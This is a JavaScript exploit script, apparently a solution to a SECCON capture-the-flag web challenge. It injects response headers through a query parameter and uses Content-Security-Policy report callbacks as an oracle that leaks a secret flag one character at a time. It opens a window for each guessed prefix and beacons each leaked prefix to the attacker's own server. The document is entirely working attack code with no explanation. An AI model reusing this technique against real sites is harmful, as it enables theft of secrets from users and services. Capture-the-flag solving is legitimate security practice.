const BASE_URL = new URLSearchParams(location.search).get("baseUrl");
const CHARS = "}_abcdefghijklmnopqrstuvwxyz";

const sleep = async (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const calcIntegrity = (data) =>
  "sha256-" + CryptoJS.enc.Base64.stringify(CryptoJS.SHA256(data));

const leak = async (known) => {
  const ws = [];
  const prefixes = [];

  for (const c of CHARS) {
    const prefix = known + c;
    prefixes.push(prefix);

    const body = `
<style>Status: 200 OK
Content-Type: text/plain; charset=utf-8

${prefix}`.trimStart();
    const integrity = calcIntegrity(body.replace("<style>", ""));
    const contentLength = body.replaceAll("\n", "\r\n").length;

    const q = `
Content-Type: text/html
Content-Length: ${contentLength}
Content-Security-Policy-Report-Only: style-src '${integrity}'; report-uri ${location.origin}/csp-report

<style>`.trimStart();

    const url = `${BASE_URL}?${new URLSearchParams({ q, prefix })}`;
    ws.push(open(url));
  }

  const reportedPrefixes = new Set(
    await fetch(
      `${location.origin}/reported-prefixes?len=${CHARS.length - 1}`
    ).then((r) => r.json())
  );

  for (const w of ws) {
    w.close();
  }
  for (const prefix of prefixes) {
    if (!reportedPrefixes.has(prefix)) {
      return prefix;
    }
  }
  throw "Not found";
};

const main = async () => {
  let known = "SECCON{";
  while (!known.endsWith("}")) {
    known = await leak(known);
    navigator.sendBeacon(`${location.origin}/leaked`, known);
  }
  navigator.sendBeacon(`${location.origin}/flag`, known);
};
main();
